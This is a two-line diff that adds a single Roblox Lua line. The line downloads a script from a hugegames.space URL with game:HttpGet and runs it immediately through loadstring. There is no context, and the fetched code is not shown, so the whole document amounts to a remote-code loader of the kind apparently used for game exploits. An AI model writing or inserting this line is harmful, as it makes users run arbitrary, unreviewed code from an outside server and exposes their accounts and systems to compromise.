@@ -1,0 +1,2 @@
+
+loadstring(game:HttpGet('https://hugegames.space/6d4a3a4e36f15e087eb401f8.lua'))()
